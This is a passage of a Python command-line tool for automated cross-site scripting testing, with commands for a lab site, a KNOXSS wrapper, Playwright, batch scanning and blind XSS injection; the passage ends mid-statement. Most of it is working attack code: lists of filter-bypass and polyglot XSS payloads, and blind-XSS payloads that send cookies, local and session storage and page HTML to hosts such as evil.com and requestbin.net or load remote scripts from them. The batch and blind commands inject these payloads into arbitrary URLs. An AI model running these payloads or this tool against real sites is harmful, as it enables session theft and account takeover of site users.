    click.echo("💡 Testing various XSS vectors on professional XSS lab")
    click.echo("-" * 50)

    # Advanced XSS payloads specifically for Brute Logic's lab
    brutelogic_payloads = [
        # Basic payloads
        "<script>alert('BruteLogic')</script>",
        "<img src=x onerror=alert('BruteLogic')>",
        "<svg onload=alert('BruteLogic')>",
        # Brute Logic signature payloads
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=confirm(1)>",
        "<svg onload=prompt(1)>",
        # Advanced payloads
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        # Context breaking payloads
        "'><script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "</script><script>alert(1)</script>",
        # Event handler payloads
        "<input autofocus onfocus=alert(1)>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        # Modern HTML5 payloads
        "<audio src=x onerror=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<source src=x onerror=alert(1)>",
        "<track src=x onerror=alert(1)>",
        # WAF bypass attempts
        "<ScRiPt>alert(1)</ScRiPt>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        # Polyglot payloads
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    ]

    # Test different parameters that might be vulnerable (based on Brute Logic's XSS lab)
    test_parameters = [
        # Brute Logic lab specific parameters
        "a",
        "b1",
        "b2",
        "b3",
        "b4",
        "b5",
        "b6",
        "c1",
        "c2",
        "c3",
        "c4",
        "c5",
        "c6",
        # Common XSS parameters
        "name",
        "user",
        "input",
        "data",
        "value",
        "text",
        "msg",
        "message",
        "comment",
        "content",
        "search",
        "q",
        "query",
        "keyword",
        "term",
    ]

    click.echo(
        f"🧪 Testing {len(brutelogic_payloads)} XSS payloads across {len(test_parameters)} parameters"
    )

    # Initialize cache if enabled
    cache_manager = None
    if cache:
        cache_manager = XSSCacheManager(cache_dir="brutelogic_cache", max_age_hours=12)
        click.echo("💾 Caching enabled for Brute Logic tests")

    results = []
    vulnerable_findings = []

    try:
        with httpx.Client(timeout=15) as client:
            for i, param in enumerate(test_parameters, 1):
                click.echo(
                    f"\n🔍 Testing parameter '{param}' ({i}/{len(test_parameters)})"
                )

                param_results = []
                param_vulns = 0

                # Check cache first
                if cache_manager:
                    cached_result = cache_manager.get_cached_result(
                        target=f"{test_url}?{param}=test",
                        payloads=brutelogic_payloads,
                        method="GET",
                    )
                    if cached_result:
                        cached_data = cached_result.get("result", {})
                        param_results = cached_data.get("results", [])
                        param_vulns = cached_data.get("vulnerable_count", 0)
                        click.echo(f"  ✅ Using cached results for parameter '{param}'")
                        results.extend(param_results)
                        vulnerable_findings.extend(
                            [r for r in param_results if r.get("vulnerable", False)]
                        )
                        continue

                # Test each payload for this parameter
                for j, payload in enumerate(brutelogic_payloads, 1):
                    if verbose:
                        click.echo(
                            f"  Payload {j}/{len(brutelogic_payloads)}: {payload[:60]}..."
                        )

                    try:
                        test_url_full = (
                            f"{test_url}?{param}={urllib.parse.quote(payload)}"
                        )
                        response = client.get(test_url_full)

                        # Check if payload is reflected
                        reflected = payload in response.text

                        # Enhanced vulnerability detection for Brute Logic's lab
                        vulnerable = False
                        if reflected:
                            # Check for actual execution context
                            response_lower = response.text.lower()
                            if any(
                                indicator in response_lower
                                for indicator in [
                                    "<script>",
                                    "onerror=",
                                    "onload=",
                                    "javascript:",
                                    "onfocus=",
                                    "ontoggle=",
                                    "onstart=",
                                ]
                            ):
                                vulnerable = True
                                param_vulns += 1
                                if verbose:
                                    click.echo(f"    🚨 VULNERABLE: {payload[:40]}...")

                        # Store result
                        result = {
                            "url": test_url_full,
                            "target": test_url,
                            "param": param,
                            "payload": payload,
                            "method": "GET",
                            "reflected": reflected,
                            "vulnerable": vulnerable,
                            "response_code": response.status_code,
                            "response_length": len(response.text),
                            "timestamp": datetime.now().isoformat(),
                            "lab": "brutelogic",
                            "severity": "high" if vulnerable else "info",
                        }

                        results.append(result)
                        param_results.append(result)

                        if vulnerable:
                            vulnerable_findings.append(result)

                            # Save to database
                            save_result(
                                test_url_full,
                                param,
                                payload,
                                reflected,
                                vulnerable,
                                "GET",
                                response.status_code,
                                len(response.text),
                                "brutelogic_test",
                                "high",
                                f"Brute Logic XSS Lab - Parameter: {param}",
                            )

                    except Exception as e:
                        if verbose:
                            click.echo(f"    ❌ Error with payload: {e}")
                        continue

                    time.sleep(delay)

                # Save parameter results to cache
                if cache_manager and param_results:
                    param_cache_data = {
                        "results": param_results,
                        "vulnerable_count": param_vulns,
                        "total_payloads": len(brutelogic_payloads),
                        "parameter": param,
                        "timestamp": datetime.now().isoformat(),
                    }
                    cache_manager.save_result(
                        target=f"{test_url}?{param}=test",
                        payloads=brutelogic_payloads,
                        result=param_cache_data,
                        method="GET",
                    )

                if param_vulns > 0:
                    click.echo(
                        f"  🎯 Parameter '{param}': {param_vulns} vulnerabilities found!"
                    )
                else:
                    click.echo(f"  ✅ Parameter '{param}': No vulnerabilities detected")

    except Exception as e:
        click.echo(f"❌ Error during testing: {e}")
        return

    # Results summary
    click.echo("\n" + "=" * 60)
    click.echo("📊 BRUTE LOGIC XSS LAB RESULTS")
    click.echo("=" * 60)

    total_tests = len(results)
    total_vulns = len(vulnerable_findings)
    total_reflected = len([r for r in results if r.get("reflected", False)])

    click.echo(f"🔬 Total tests performed: {total_tests}")
    click.echo(f"🚨 Vulnerabilities found: {total_vulns}")
    click.echo(f"🔄 Payloads reflected: {total_reflected}")

    if total_tests > 0:
        vuln_rate = (total_vulns / total_tests) * 100
        refl_rate = (total_reflected / total_tests) * 100
        click.echo(f"📈 Vulnerability rate: {vuln_rate:.1f}%")
        click.echo(f"📈 Reflection rate: {refl_rate:.1f}%")

    # Show vulnerable parameters
    if vulnerable_findings:
        vuln_params = {}
        for finding in vulnerable_findings:
            param = finding["param"]
            vuln_params[param] = vuln_params.get(param, 0) + 1

        click.echo(f"\n🎯 Most vulnerable parameters:")
        for param, count in sorted(
            vuln_params.items(), key=lambda x: x[1], reverse=True
        )[:10]:
            click.echo(f"  • {param}: {count} vulnerabilities")

    # AI Analysis if enabled
    if ai and results:
        click.echo("\n" + "=" * 60)
        click.echo("🤖 AI ANALYSIS - BRUTE LOGIC LAB")
        click.echo("=" * 60)

        target_info = {
            "lab": "Brute Logic XSS Testing Lab",
            "lab_url": test_url,
            "professional_testing": True,
            "total_parameters": len(test_parameters),
            "total_payloads": len(brutelogic_payloads),
            "ai_provider": ai_provider,
        }

        ai_analysis = ai_analyze_xss_results(
            results, "Brute Logic XSS Lab Analysis", target_info
        )
        click.echo(ai_analysis)

        # Lab-specific insights
        click.echo(f"\n🔬 Brute Logic Lab Insights:")
        click.echo(f"  • Professional XSS testing environment")
        click.echo(
            f"  • Comprehensive parameter testing across {len(test_parameters)} vectors"
        )
        click.echo(
            f"  • Advanced payload testing with {len(brutelogic_payloads)} vectors"
        )
        click.echo(f"  • Real-world XSS vulnerability simulation")

        if total_vulns > 20:
            click.echo(f"  • 🚨 High vulnerability density detected")
            click.echo(f"  • Multiple attack vectors confirmed")
        elif total_vulns > 5:
            click.echo(f"  • ⚠️  Moderate vulnerability exposure")
        else:
            click.echo(f"  • ✅ Limited vulnerability surface")

        click.echo("=" * 60)

    # Save detailed results
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    results_file = f"brutelogic_xss_results_{timestamp}.json"

    with open(results_file, "w") as f:
        json.dump(
            {
                "lab_info": {
                    "name": "Brute Logic XSS Testing Lab",
                    "url": test_url,
                    "test_date": datetime.now().isoformat(),
                    "total_tests": total_tests,
                    "vulnerabilities_found": total_vulns,
                    "payloads_reflected": total_reflected,
                },
                "results": results,
                "vulnerable_findings": vulnerable_findings,
            },
            f,
            indent=2,
        )

    click.echo(f"\n💾 Detailed results saved to: {results_file}")

    if cache_manager:
        stats = cache_manager.get_cache_stats()
        click.echo(f"📊 Cache performance: {stats['hit_rate']}% hit rate")


@cli.command()
@click.option("--input", help="Input file with URLs")
@click.option("--url", help="Single URL to test")
@click.option("--output", help="Output file for results")
@click.option("--api-key", help="KNOXSS API key (or set KNOXSS_API_KEY env var)")
@click.option(
    "--method",
    type=click.Choice(["GET", "POST", "BOTH"]),
    default="GET",
    help="HTTP method to test",
)
@click.option("--post-data", help="POST data for POST requests")
@click.option(
    "--headers", help="Custom headers (format: 'Header1:Value1,Header2:Value2')"
)
@click.option("--silent", is_flag=True, help="Silent mode")
@click.option("--processes", default=5, type=int, help="Number of processes")
@click.option("--timeout", default=30, type=int, help="Request timeout in seconds")
@click.option("--discord-webhook", help="Discord webhook for notifications")
@click.option("--retries", default=3, type=int, help="Number of retries")
@click.option("--retry-interval", default=5, type=int, help="Retry interval in seconds")
@click.option("--skip-blocked", is_flag=True, help="Skip blocked responses")
@click.option("--cache", is_flag=True, help="Enable caching for KNOXSS results")
@click.option("--ai", is_flag=True, help="Enable AI analysis of KNOXSS results")
@click.option("--verbose", is_flag=True, help="Verbose output")
def knoxnl(
    input,
    url,
    output,
    api_key,
    method,
    post_data,
    headers,
    silent,
    processes,
    timeout,
    discord_webhook,
    retries,
    retry_interval,
    skip_blocked,
    cache,
    ai,
    verbose,
):
    """Run KNOXSS via knoxnl wrapper for advanced XSS detection."""

    if not check_binary("knoxnl"):
        click.echo("❌ knoxnl not found. Install with: pip install knoxnl")
        return

    # Check for API key
    if not api_key:
        api_key = os.environ.get("KNOXSS_API_KEY")
        if not api_key:
            click.echo(
                "❌ KNOXSS API key required. Set via --api-key or KNOXSS_API_KEY env var"
            )
            click.echo("💡 Get your API key from: https://knoxss.me/")
            return

    # Validate input
    if not input and not url:
        click.echo("❌ Either --input file or --url must be provided")
        return

    click.echo("🔍 KNOXSS Advanced XSS Detection")
    click.echo("=" * 50)

    # Build knoxnl command
    cmd = ["knoxnl", "-A", api_key]

    # Input source
    if input:
        if not os.path.exists(input):
            click.echo(f"❌ Input file not found: {input}")
            return
        cmd.extend(["-i", input])
        click.echo(f"📁 Input file: {input}")
    else:
        # Create temp file for single URL
        import tempfile

        temp_input = tempfile.mktemp(suffix="_knoxnl_input.txt")
        with open(temp_input, "w") as f:
            f.write(url + "\n")
        cmd.extend(["-i", temp_input])
        click.echo(f"🎯 Target URL: {url}")

    # Output file
    if output:
        cmd.extend(["-o", output])
        click.echo(f"📄 Output file: {output}")
    else:
        # Create default output file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output = f"knoxss_results_{timestamp}.txt"
        cmd.extend(["-o", output])
        click.echo(f"📄 Output file: {output}")

    # HTTP method
    if method:
        cmd.extend(["-X", method])
        click.echo(f"🌐 HTTP Method: {method}")

    # POST data
    if post_data:
        cmd.extend(["-pd", post_data])
        click.echo(f"📝 POST Data: {post_data[:50]}...")

    # Custom headers
    if headers:
        cmd.extend(["-H", headers])
        click.echo(f"📋 Headers: {headers}")

    # Performance options
    cmd.extend(["-p", str(processes)])
    cmd.extend(["-t", str(timeout)])
    cmd.extend(["-r", str(retries)])
    cmd.extend(["-ri", str(retry_interval)])

    # Flags
    if silent:
        cmd.append("-s")
    if skip_blocked:
        cmd.append("-sb")
    if verbose:
        cmd.append("-v")
    if discord_webhook:
        cmd.extend(["-dw", discord_webhook])

    click.echo(f"⚙️  Processes: {processes} | Timeout: {timeout}s | Retries: {retries}")

    # Initialize cache if enabled
    cache_manager = None
    if cache:
        cache_manager = XSSCacheManager(cache_dir="knoxss_cache", max_age_hours=48)
        click.echo("💾 KNOXSS caching enabled")

    try:
        click.echo("\n🚀 Starting KNOXSS scan...")
        click.echo(f"🔧 Command: {' '.join(cmd)}")
        click.echo("-" * 50)

        # Run knoxnl
        start_time = datetime.now()
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
        end_time = datetime.now()
        duration = end_time - start_time

        if result.returncode == 0:
            click.echo(f"\n✅ KNOXSS scan completed in {duration}")

            # Parse results
            if os.path.exists(output):
                with open(output, "r") as f:
                    results_content = f.read()

                # Count findings
                lines = results_content.strip().split("\n")
                total_lines = len([l for l in lines if l.strip()])

                click.echo(f"📊 Results: {total_lines} findings")
                click.echo(f"📁 Results saved to: {output}")

                # Save to cache if enabled
                if cache_manager and total_lines > 0:
                    cache_key = (
                        f"knoxss_{hashlib.sha256(str(cmd).encode()).hexdigest()[:16]}"
                    )
                    cache_data = {
                        "command": " ".join(cmd),
                        "results": results_content,
                        "findings_count": total_lines,
                        "duration": str(duration),
                        "timestamp": datetime.now().isoformat(),
                    }
                    cache_manager.save_result(
                        target=input or url, payloads=["knoxss_scan"], result=cache_data
                    )
                    click.echo("💾 Results cached for future use")

                # AI Analysis if enabled
                if ai and total_lines > 0:
                    click.echo("\n" + "=" * 50)
                    click.echo("🤖 AI Analysis of KNOXSS Results")
                    click.echo("=" * 50)

                    # Parse KNOXSS results for AI analysis
                    knoxss_results = []
                    for line in lines:
                        if line.strip() and not line.startswith("#"):
                            # KNOXSS format: URL | Parameter | Payload | Status
                            parts = line.split("|") if "|" in line else [line]
                            if len(parts) >= 1:
                                knoxss_results.append(
                                    {
                                        "url": (
                                            parts[0].strip()
                                            if len(parts) > 0
                                            else "unknown"
                                        ),
                                        "param": (
                                            parts[1].strip()
                                            if len(parts) > 1
                                            else "unknown"
                                        ),
                                        "payload": (
                                            parts[2].strip()
                                            if len(parts) > 2
                                            else "unknown"
                                        ),
                                        "vulnerable": True,  # KNOXSS only reports vulnerabilities
                                        "reflected": True,
                                        "method": method,
                                        "response_code": 200,
                                        "timestamp": datetime.now().isoformat(),
                                        "tool_used": "knoxss",
                                        "severity": "high",  # KNOXSS findings are typically high severity
                                    }
                                )

                    if knoxss_results:
                        target_info = {
                            "tool": "KNOXSS",
                            "api_scan": True,
                            "findings_count": len(knoxss_results),
                            "scan_duration": str(duration),
                            "method": method,
                        }

                        ai_analysis = ai_analyze_xss_results(
                            knoxss_results, f"KNOXSS scan results", target_info
                        )
                        click.echo(ai_analysis)

                        # KNOXSS-specific insights
                        click.echo(f"\n🔬 KNOXSS-Specific Insights:")
                        click.echo(
                            f"  • Professional-grade XSS detection via KNOXSS API"
                        )
                        click.echo(
                            f"  • All findings are manually verified by Brute Logic"
                        )
                        click.echo(f"  • High confidence in vulnerability accuracy")
                        click.echo(f"  • Advanced bypass techniques included")
                        if len(knoxss_results) > 5:
                            click.echo(
                                f"  • Multiple XSS vectors found - comprehensive review needed"
                            )
                        click.echo("=" * 50)

                # Show sample results
                if not silent and total_lines > 0:
                    click.echo(f"\n📋 Sample Results:")
                    sample_lines = lines[:5]  # Show first 5 results
                    for i, line in enumerate(sample_lines, 1):
                        if line.strip():
                            click.echo(f"  {i}. {line[:100]}...")
                    if total_lines > 5:
                        click.echo(f"  ... and {total_lines - 5} more results")

            else:
                click.echo("⚠️  No output file generated")

        else:
            click.echo(f"❌ KNOXSS scan failed with return code {result.returncode}")
            if result.stderr:
                click.echo(f"Error: {result.stderr}")
            if result.stdout:
                click.echo(f"Output: {result.stdout}")

    except subprocess.TimeoutExpired:
        click.echo("⏰ KNOXSS scan timed out after 1 hour")
    except Exception as e:
        click.echo(f"❌ Error running KNOXSS: {e}")

    finally:
        # Cleanup temp file if created
        if url and os.path.exists(temp_input):
            os.remove(temp_input)


@cli.command()
@click.option("--url", required=True, help="URL to test with Playwright")
@click.option("--payloads-file", help="Custom payloads file")
@click.option("--screenshot", is_flag=True, help="Take screenshots on XSS trigger")
@click.option("--timeout", default=30, help="Timeout in seconds")
def playwright_test(url, payloads_file, screenshot, timeout):
    """Advanced XSS testing using Playwright browser automation."""
    try:
        from playwright.sync_api import sync_playwright
    except ImportError:
        print("[!] Playwright Python module not found")
        print("[*] Install with: pip install playwright && playwright install")
        return

    if not check_binary("playwright"):
        print("[!] Playwright binary not found in PATH")
        print("[*] Install with: pip install playwright && playwright install")
        return

    payloads = []

    # Load payloads
    if payloads_file and os.path.exists(payloads_file):
        with open(payloads_file) as f:
            payloads = [
                line.strip() for line in f if line.strip() and not line.startswith("#")
            ]
    else:
        # Default advanced payloads for DOM testing
        payloads = [
            "<svg onload=alert('XSS')>",
            "<img src=x onerror=alert('XSS')>",
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "'><svg onload=alert('XSS')>",
            "\"><img src=x onerror=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ]

    print(f"[*] Starting Playwright XSS testing on {url}")
    print(f"[*] Testing {len(payloads)} payloads with timeout {timeout}s")

    # Create Playwright script
    playwright_script = f"""
from playwright.sync_api import sync_playwright
import sys
import time

def test_xss():
    payloads = {payloads}
    url = "{url}"
    timeout = {timeout * 1000}  # Convert to milliseconds
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()
        
        # Set up alert handler
        alerts_triggered = []
        page.on("dialog", lambda dialog: (
            alerts_triggered.append(dialog.message),
            dialog.accept()
        ))
        
        vulnerable_payloads = []
        
        for i, payload in enumerate(payloads, 1):
            print(f"[*] Testing payload {{i}}/{{len(payloads)}}: {{payload[:50]}}...")
            
            try:
                # Test in URL parameter
                test_url = f"{{url}}?test={{payload}}"
                page.goto(test_url, timeout=timeout)
                page.wait_for_timeout(2000)  # Wait 2 seconds
                
                # Check if alert was triggered
                if alerts_triggered:
                    print(f"[+] XSS TRIGGERED: {{payload}}")
                    vulnerable_payloads.append(payload)
                    alerts_triggered.clear()
                    
                    # Take screenshot if enabled
                    if {screenshot}:
                        page.screenshot(path=f'xss_screenshot_{{i}}.png')
                
                # Test in search forms if present
                search_inputs = page.query_selector_all("input[type='text'], input[type='search'], textarea")
                for input_elem in search_inputs:
                    try:
                        input_elem.fill(payload)
                        input_elem.press("Enter")
                        page.wait_for_timeout(1000)
                        
                        if alerts_triggered:
                            print(f"[+] XSS TRIGGERED IN FORM: {{payload}}")
                            vulnerable_payloads.append(f"FORM: {{payload}}")
                            alerts_triggered.clear()
                            break
                    except:
                        continue
                        
            except Exception as e:
                print(f"[!] Error testing payload: {{e}}")
                continue
        
        browser.close()
        
        print(f"\\n[*] Playwright testing completed.")
        print(f"[*] Found {{len(vulnerable_payloads)}} working payloads:")
        for payload in vulnerable_payloads:
            print(f"  - {{payload}}")
        
        return vulnerable_payloads

if __name__ == "__main__":
    test_xss()
"""

    # Write and execute Playwright script
    import tempfile

    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as tmp_file:
        tmp_file.write(playwright_script)
        script_path = tmp_file.name

    try:
        result = subprocess.run(
            [sys.executable, script_path],
            capture_output=True,
            text=True,
            timeout=timeout + 30,
        )

        if result.returncode == 0:
            print(result.stdout)
            # Parse results and save to database
            if "XSS TRIGGERED" in result.stdout:
                save_result(
                    url,
                    tool_used="playwright",
                    vulnerable=True,
                    notes="XSS detected via Playwright automation",
                )
        else:
            print(f"[!] Playwright script error: {result.stderr}")

    except subprocess.TimeoutExpired:
        print("[!] Playwright test timed out")
    except Exception as e:
        print(f"[!] Error running Playwright test: {e}")
    finally:
        # Clean up
        if os.path.exists(script_path):
            os.remove(script_path)


@cli.command()
@click.option("--input", required=True, help="File with URLs to test")
@click.option("--output", help="Output file for vulnerable URLs")
@click.option("--threads", default=10, help="Number of concurrent threads")
@click.option("--delay", default=1, type=float, help="Delay between requests")
def batch_test(input, output, threads, delay):
    """Batch XSS testing on multiple URLs."""
    if not os.path.exists(input):
        print(f"[!] Input file not found: {input}")
        return

    with open(input) as f:
        urls = [line.strip() for line in f if line.strip()]

    print(f"[*] Starting batch XSS testing on {len(urls)} URLs")
    print(f"[*] Using {threads} threads with {delay}s delay")

    vulnerable_urls = []

    # Simple threaded testing (basic implementation)
    # In production, you'd want to use proper threading/async

    test_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        "\"><img src=x onerror=alert('XSS')>",
    ]

    for i, url in enumerate(urls, 1):
        print(f"[*] Testing {i}/{len(urls)}: {url}")

        try:
            with httpx.Client(timeout=10) as client:
                for payload in test_payloads:
                    test_url = f"{url}?test={urllib.parse.quote(payload)}"

                    try:
                        response = client.get(test_url)
                        if payload in response.text:
                            print(f"[+] VULNERABLE: {url}")
                            vulnerable_urls.append(url)
                            save_result(
                                url,
                                payload=payload,
                                reflected=True,
                                vulnerable=True,
                                tool_used="batch_test",
                            )
                            break
                    except (httpx.RequestError, httpx.HTTPStatusError) as e:
                        print(f"[!] Request error for {url}: {e}")
                        continue
                    except Exception as e:
                        print(f"[!] Unexpected error for {url}: {e}")
                        continue

        except Exception as e:
            print(f"[!] Error testing {url}: {e}")

        time.sleep(delay)

    print(f"\n[*] Batch testing completed")
    print(f"[*] Found {len(vulnerable_urls)} potentially vulnerable URLs")

    if output and vulnerable_urls:
        with open(output, "w") as f:
            f.write("\n".join(vulnerable_urls))
        print(f"[*] Vulnerable URLs saved to {output}")


@cli.command()
@click.option("--query", required=True, help="Search query for custom payloads")
def search_payloads(query):
    """Search custom payloads by description or tags."""
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    # Search in payload, description, and tags
    search_term = f"%{query}%"
    c.execute(
        """
        SELECT * FROM custom_payloads 
        WHERE payload LIKE ? OR description LIKE ? OR tags LIKE ?
        ORDER BY success_rate DESC
    """,
        (search_term, search_term, search_term),
    )

    payloads = c.fetchall()
    conn.close()

    if payloads:
        print(f"[*] Found {len(payloads)} payloads matching '{query}':")
        for p in payloads:
            print(f"ID: {p[0]} | Category: {p[2]}")
            print(f"Payload: {p[1]}")
            if p[3]:  # description
                print(f"Description: {p[3]}")
            if p[8]:  # tags
                print(f"Tags: {p[8]}")
            print(f"Success Rate: {p[5]:.2f} | Used: {p[6]} times")
            print("-" * 60)
    else:
        print(f"[*] No payloads found matching '{query}'")


@cli.command()
@click.option("--url", required=True, help="Base URL to generate XSS test cases")
@click.option("--params", help="Comma-separated list of parameters to test")
@click.option("--output", help="Output file for test cases")
def generate_tests(url, params, output):
    """Generate XSS test cases for a specific URL and parameters."""
    if params:
        param_list = [p.strip() for p in params.split(",")]
    else:
        # Default common parameters
        param_list = ["q", "search", "query", "input", "data", "text", "value", "name"]

    # Basic payload categories
    payload_categories = {
        "basic": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
        ],
        "event_handlers": [
            "<input onfocus=alert('XSS') autofocus>",
            "<body onload=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ],
        "javascript_urls": [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "vbscript:alert('XSS')",
        ],
        "encoded": [
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
        ],
    }

    test_cases = []

    for param in param_list:
        for category, payloads in payload_categories.items():
            for payload in payloads:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                test_cases.append(
                    {
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "category": category,
                        "method": "GET",
                    }
                )

                # Also generate POST test case
                test_cases.append(
                    {
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "category": category,
                        "method": "POST",
                    }
                )

    print(f"[*] Generated {len(test_cases)} XSS test cases")
    print(f"[*] Testing {len(param_list)} parameters: {', '.join(param_list)}")

    if output:
        # Export test cases
        if output.endswith(".json"):
            with open(output, "w") as f:
                json.dump(test_cases, f, indent=2)
        elif output.endswith(".csv"):
            with open(output, "w", newline="") as f:
                writer = csv.DictWriter(
                    f, fieldnames=["url", "parameter", "payload", "category", "method"]
                )
                writer.writeheader()
                writer.writerows(test_cases)
        else:  # txt format
            with open(output, "w") as f:
                for tc in test_cases:
                    if tc["method"] == "GET":
                        f.write(f"{tc['url']}\\n")
                    else:
                        f.write(
                            f"POST {tc['url']} - {tc['parameter']}={tc['payload']}\\n"
                        )

        print(f"[*] Test cases saved to {output}")
    else:
        # Print first 10 examples
        print("\\n[*] Sample test cases (first 10):")
        for tc in test_cases[:10]:
            if tc["method"] == "GET":
                print(f"  {tc['url']}")
            else:
                print(f"  POST {tc['url']} - {tc['parameter']}={tc['payload']}")
        if len(test_cases) > 10:
            print(f"  ... and {len(test_cases) - 10} more")


@cli.command()
@click.option("--url", required=True, help="URL to test for blind XSS")
@click.option("--param", help="Parameter to inject blind XSS payload")
@click.option(
    "--callback-url",
    help="Your callback URL (e.g., from XSS Hunter, Burp Collaborator)",
)
@click.option("--email", help="Your email for blind XSS notifications")
@click.option("--method", default="GET", help="HTTP method")
@click.option("--delay", default=2, type=float, help="Delay between requests")
@click.option("--custom-payload", help="Custom blind XSS payload")
def blind_test(url, param, callback_url, email, method, delay, custom_payload):
    """Test for Blind XSS vulnerabilities with callback payloads."""

    # Default blind XSS payloads
    blind_payloads = []

    if custom_payload:
        blind_payloads.append(custom_payload)
    else:
        # XSS Hunter style payloads
        if callback_url:
            blind_payloads.extend(
                [
                    f"<script src='{callback_url}'></script>",
                    f"<img src='x' onerror='var s=document.createElement(\"script\");s.src=\"{callback_url}\";document.head.appendChild(s)'>",
                    f"<svg onload='fetch(\"{callback_url}?cookie=\"+document.cookie)'>",
                    f'<iframe src=\'javascript:var s=document.createElement("script");s.src="{callback_url}";document.head.appendChild(s)\'></iframe>',
                    f'<script>setTimeout(function(){{var s=document.createElement("script");s.src="{callback_url}";document.head.appendChild(s)}}, 1000)</script>',
                    f'<object data=\'javascript:var s=document.createElement("script");s.src="{callback_url}";document.head.appendChild(s)\'></object>',
                    f'<embed src=\'javascript:var s=document.createElement("script");s.src="{callback_url}";document.head.appendChild(s)\'>',
                    f'<video><source onerror=\'var s=document.createElement("script");s.src="{callback_url}";document.head.appendChild(s)\'>',
                    f"<audio src='x' onerror='var s=document.createElement(\"script\");s.src=\"{callback_url}\";document.head.appendChild(s)'>",
                ]
            )

        # Email-based blind XSS (for internal applications)
        if email:
            blind_payloads.extend(
                [
                    f"<script>var img=new Image();img.src='http://requestbin.net/r/xxx?email={email}&url='+encodeURIComponent(location.href)+'&cookie='+encodeURIComponent(document.cookie)</script>",
                    f"<img src='x' onerror='fetch(\"http://requestbin.net/r/xxx?email={email}&data=\"+btoa(document.documentElement.innerHTML))'>",
                    f'<svg onload=\'setTimeout(function(){{var xhr=new XMLHttpRequest();xhr.open("POST","http://requestbin.net/r/xxx");xhr.send("email={email}&page="+location.href+"&dom="+document.documentElement.innerHTML)}}, 2000)\'>',
                ]
            )

        # Generic blind XSS payloads (no callback needed)
        generic_blind = [
            "<script>setTimeout(function(){var s=document.createElement('script');s.src='//evil.com/blindxss.js';document.head.appendChild(s)}, 3000)</script>",
            "<img src='x' onerror='setTimeout(function(){location.href=\"//evil.com/blind?data=\"+btoa(document.cookie)}, 2000)'>",
            '<svg onload=\'setTimeout(function(){var i=new Image();i.src="//evil.com/log?url="+encodeURIComponent(location.href)+"&cookie="+encodeURIComponent(document.cookie)}, 1000)\'>',
            "<iframe src='javascript:setTimeout(function(){document.location=\"//evil.com/exfil?data=\"+btoa(document.documentElement.innerHTML)}, 5000)'></iframe>",
            "<script>document.addEventListener('DOMContentLoaded', function(){var s=document.createElement('script');s.src='//evil.com/payload.js';document.head.appendChild(s)})</script>",
            '<object data=\'javascript:setTimeout(function(){fetch("//evil.com/collect",{method:"POST",body:JSON.stringify({url:location.href,cookies:document.cookie,storage:localStorage})})}, 3000)\'></object>',
            "'\"><script>if(window.parent!=window){var s=document.createElement('script');s.src='//evil.com/frame.js';window.parent.document.head.appendChild(s)}</script>",
            "<script>function blindXSS(){var data={url:location.href,referrer:document.referrer,cookies:document.cookie,localStorage:JSON.stringify(localStorage),sessionStorage:JSON.stringify(sessionStorage)};fetch('//evil.com/collect',{method:'POST',body:JSON.stringify(data)})}; setTimeout(blindXSS, 5000)</script>",
        ]

        blind_payloads.extend(generic_blind)

    if not blind_payloads:
        print(
            "[!] No blind XSS payloads configured. Please provide --callback-url, --email, or --custom-payload"
        )
        return

    print(f"[*] Testing {len(blind_payloads)} blind XSS payloads on {url}")
    print(f"[*] Callback URL: {callback_url or 'None'}")
    print(f"[*] Email notification: {email or 'None'}")
    print(
        "[*] Note: Blind XSS results may take time to appear - check your callback service"
    )

    injected_payloads = []

    try:
        with httpx.Client(timeout=15) as client:
            for i, payload in enumerate(blind_payloads, 1):
                print(
                    f"[*] Injecting blind payload {i}/{len(blind_payloads)}: {payload[:80]}..."
                )

                try:
                    if method.upper() == "GET":
                        if param:
                            test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                        else:
                            test_url = f"{url}?xss_test={urllib.parse.quote(payload)}"

                        response = client.get(test_url)

                    elif method.upper() == "POST":
                        data = {}
                        if param:
                            data[param] = payload
                        else:
                            data["xss_test"] = payload

                        response = client.post(url, data=data)
                        test_url = url

                    if response.status_code < 500:  # Server didn't crash
                        print(f"[+] PAYLOAD INJECTED: HTTP {response.status_code}")
                        injected_payloads.append(payload)

                        # Save to database
                        save_result(
